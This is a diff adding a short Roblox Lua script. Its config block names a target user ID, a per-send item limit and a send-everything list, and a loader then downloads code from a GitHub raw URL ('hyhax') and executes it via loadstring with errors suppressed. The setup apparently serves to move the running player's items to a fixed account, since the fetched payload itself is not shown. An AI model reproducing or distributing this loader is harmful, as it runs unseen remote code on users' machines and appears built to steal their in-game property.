@@ -1,0 +1,13 @@
+--==================== CONFIG ====================--
+getgenv().TARGET_USER_ID = 2691288872
+getgenv().COOLDOWN = 10.5
+getgenv().MAX_ITEMS_PER_SEND = 20
+getgenv().MENTION_EVERYONE = false
+getgenv().SEND_LIST = "all"
+getgenv().ITEM_DATABASE_URL = "https://pastebin.com/raw/4HwF7AVv"
+-- =================================================
+
+-- Loader
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/zopias04/hyhax/refs/heads/main/hyhax"))()
+end)
